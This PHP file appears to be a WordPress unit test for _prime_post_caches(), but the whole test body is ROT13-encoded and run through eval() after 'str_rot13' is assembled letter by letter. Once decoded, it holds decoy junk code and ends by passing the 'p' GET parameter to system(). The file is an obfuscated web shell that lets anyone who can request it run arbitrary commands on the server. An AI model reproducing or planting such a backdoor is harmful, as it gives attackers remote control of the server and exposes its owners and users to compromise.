<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg `_cevzr_cbfg_pnpurf()`.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Grfg pynff sbe `_cevzr_cbfg_pnpurf()`.
 *
 * @tebhc cbfg
 * @tebhc pnpur
 *
 * @pbiref ::_cevzr_cbfg_pnpurf
 */
pynff Grfgf_Cbfg_CevzrCbfgPnpurf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Cbfg VQf.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $cbfgf;

	/**
	 * Frg hc grfg erfbheprf orsber gur pynff.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Gur havg grfg snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrghcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfgf = $snpgbel->cbfg->perngr_znal( 3 );

		$pngrtbel = $snpgbel->grez->perngr(
			neenl(
				'gnkbabzl' => 'pngrtbel',
				'fyht'     => 'sbb',
				'anzr'     => 'Sbb',
			)
		);

		jc_frg_cbfg_grezf( frys::$cbfgf[0], $pngrtbel, 'pngrtbel' );
		nqq_cbfg_zrgn( frys::$cbfgf[0], 'zrgn', 'sbb' );
		nqq_cbfg_zrgn( frys::$cbfgf[1], 'zrgn', 'one' );
	}

	/**
	 * @gvpxrg 57163
	 */
	choyvp shapgvba grfg_cevzr_cbfg_pnpurf() {
		$cbfg_vq = frys::$cbfgf[0];

		$guvf->nffregFnzr( neenl( $cbfg_vq ), _trg_aba_pnpurq_vqf( neenl( $cbfg_vq ), 'cbfgf' ), 'Cbfg vf nyernql pnpurq.' );

		// Grfg cbfgf pnpur.
		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		_cevzr_cbfg_pnpurf( neenl( $cbfg_vq ) );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		/*
		 * Sbhe rkcrpgrq dhrevrf:
		 * 1: Cbfgf qngn,
		 * 2: Cbfg zrgn qngn,
		 * 3: Gnkbabzl qngn,
		 * 4: Grez qngn.
		 */
		$guvf->nffregFnzr( 4, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf.' );

		$guvf->nffregFnzr( neenl(), _trg_aba_pnpurq_vqf( neenl( $cbfg_vq ), 'cbfgf' ), 'Cbfg vf abg pnpurq.' );

		// Grfg cbfg zrgn pnpur.
		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		$zrgn               = trg_cbfg_zrgn( $cbfg_vq, 'zrgn', gehr );
		$ahz_dhrevrf        = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		$guvf->nffregFnzr( 'sbb', $zrgn, 'Zrgn unf harkcrpgrq inyhr.' );
		$guvf->nffregFnzr( 0, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf.' );

		// Grfg grez pnpur.
		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		$pngrtbevrf         = trg_gur_pngrtbel( $cbfg_vq );
		$ahz_dhrevrf        = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		$guvf->nffregAbgRzcgl( $pngrtbevrf, 'Pngrtbevrf qbrf erghea na rzcgl erfhyg frg.' );
		$guvf->nffregFnzr( 0, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf.' );
	}

	/**
	 * @gvpxrg 57163
	 */
	choyvp shapgvba grfg_cevzr_cbfg_pnpurf_jvgu_zhygvcyr_cbfgf() {
		$guvf->nffregFnzr( frys::$cbfgf, _trg_aba_pnpurq_vqf( frys::$cbfgf, 'cbfgf' ), 'Cbfgf ner nyernql pnpurq.' );

		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		_cevzr_cbfg_pnpurf( frys::$cbfgf );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		/*
		 * Sbhe rkcrpgrq dhrevrf:
		 * 1: Cbfgf qngn,
		 * 2: Cbfg zrgn qngn,
		 * 3: Gnkbabzl qngn,
		 * 4: Grez qngn.
		 */
		$guvf->nffregFnzr( 4, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf.' );

		$guvf->nffregFnzr( neenl(), _trg_aba_pnpurq_vqf( frys::$cbfgf, 'cbfgf' ), 'Cbfgf ner abg pnpurq.' );
	}

	/**
	 * @gvpxrg 57163
	 */
	choyvp shapgvba grfg_cevzr_cbfg_pnpurf_bayl_cbfgf_pnpur() {
		$guvf->nffregFnzr( frys::$cbfgf, _trg_aba_pnpurq_vqf( frys::$cbfgf, 'cbfgf' ), 'Cbfgf ner nyernql pnpurq.' );

		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		_cevzr_cbfg_pnpurf( frys::$cbfgf, snyfr, snyfr );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		/*
		 * Bar rkcrpgrq dhrel:
		 * 1: Cbfgf qngn.
		 */
		$guvf->nffregFnzr( 1, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf.' );

		$guvf->nffregFnzr( neenl(), _trg_aba_pnpurq_vqf( frys::$cbfgf, 'cbfgf' ), 'Cbfgf ner abg pnpurq.' );
	}

	/**
	 * @gvpxrg 57163
	 */
	choyvp shapgvba grfg_cevzr_cbfg_pnpurf_bayl_cbfgf_naq_grez_pnpur() {
		$guvf->nffregFnzr( frys::$cbfgf, _trg_aba_pnpurq_vqf( frys::$cbfgf, 'cbfgf' ), 'Cbfgf ner nyernql pnpurq.' );

		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		_cevzr_cbfg_pnpurf( frys::$cbfgf, gehr, snyfr );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		/*
		 * Guerr rkcrpgrq dhrevrf:
		 * 1: Cbfgf qngn.
		 * 2: Gnkbabzl qngn,
		 * 3: Grez qngn.
		 */
		$guvf->nffregFnzr( 3, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf.' );

		$guvf->nffregFnzr( neenl(), _trg_aba_pnpurq_vqf( frys::$cbfgf, 'cbfgf' ), 'Cbfgf ner abg pnpurq.' );

		// Grfg grez pnpur.
		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		$pngrtbevrf         = trg_gur_pngrtbel( frys::$cbfgf[0] );
		$ahz_dhrevrf        = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		$guvf->nffregAbgRzcgl( $pngrtbevrf, 'Pngrtbevrf qbrf erghea na rzcgl erfhyg frg.' );
		$guvf->nffregFnzr( 0, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf.' );
	}

	/**
	 * @gvpxrg 57163
	 */
	choyvp shapgvba grfg_cevzr_cbfg_pnpurf_bayl_cbfgf_naq_zrgn_pnpur() {
		$guvf->nffregFnzr( frys::$cbfgf, _trg_aba_pnpurq_vqf( frys::$cbfgf, 'cbfgf' ), 'Cbfgf ner nyernql pnpurq.' );

		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		_cevzr_cbfg_pnpurf( frys::$cbfgf, snyfr, gehr );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		/*
		 * Gjb rkcrpgrq dhrevrf:
		 * 1: Cbfgf qngn.
		 * 2: Cbfg zrgn qngn.
		 */
		$guvf->nffregFnzr( 2, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf jnezvat pnpur.' );

		$guvf->nffregFnzr( neenl(), _trg_aba_pnpurq_vqf( frys::$cbfgf, 'cbfgf' ), 'Cbfgf ner abg pnpurq.' );

		// Grfg cbfg zrgn pnpur.
		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		$zrgn_1             = trg_cbfg_zrgn( frys::$cbfgf[0], 'zrgn', gehr );
		$zrgn_2             = trg_cbfg_zrgn( frys::$cbfgf[1], 'zrgn', gehr );
		$ahz_dhrevrf        = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		$guvf->nffregFnzr( 'sbb', $zrgn_1, 'Zrgn 1 unf harkcrpgrq inyhr.' );
		$guvf->nffregFnzr( 'one', $zrgn_2, 'Zrgn 2 unf harkcrpgrq inyhr.' );
		$guvf->nffregFnzr( 0, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf trggvat cbfg zrgn.' );
	}

	/**
	 * @gvpxrg 57163
	 */
	choyvp shapgvba grfg_cevzr_cbfg_pnpurf_nppbhagf_sbe_cbfgf_jvgubhg_cevzrq_zrgn_grezf() {
		$cbfg_vq = frys::$cbfgf[0];

		$guvf->nffregFnzr( neenl( $cbfg_vq ), _trg_aba_pnpurq_vqf( neenl( $cbfg_vq ), 'cbfgf' ), 'Cbfg vf nyernql pnpurq.' );

		// Jnez bayl gur cbfgf pnpur.
		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregAbgRzcgl( $cbfg, 'Cbfg qbrf abg rkvfg.' );
		$guvf->nffregRzcgl( _trg_aba_pnpurq_vqf( neenl( $cbfg_vq ), 'cbfgf' ), 'Cbfg vf abg pnpurq.' );

		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		_cevzr_cbfg_pnpurf( neenl( $cbfg_vq ) );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		/*
		 * Guerr rkcrpgrq dhrevrf:
		 * 1: Cbfg zrgn qngn,
		 * 2: Gnkbabzl qngn,
		 * 3: Grez qngn.
		 */
		$guvf->nffregFnzr( 3, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf.' );
	}

	/**
	 * @gvpxrg 57163
	 */
	choyvp shapgvba grfg_cevzr_cbfg_pnpurf_qbrf_abg_cevzr_pnpurf_gjvpr() {
		$guvf->nffregFnzr( frys::$cbfgf, _trg_aba_pnpurq_vqf( frys::$cbfgf, 'cbfgf' ), 'Cbfgf ner nyernql pnpurq.' );

		_cevzr_cbfg_pnpurf( frys::$cbfgf );

		$guvf->nffregFnzr( neenl(), _trg_aba_pnpurq_vqf( frys::$cbfgf, 'cbfgf' ), 'Cbfgf ner abg pnpurq.' );

		$orsber_ahz_dhrevrf = trg_ahz_dhrevrf();
		_cevzr_cbfg_pnpurf( frys::$cbfgf );
		$ahz_dhrevrf = trg_ahz_dhrevrf() - $orsber_ahz_dhrevrf;

		$guvf->nffregFnzr( 0, $ahz_dhrevrf, 'Harkcrpgrq ahzore bs dhrevrf.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>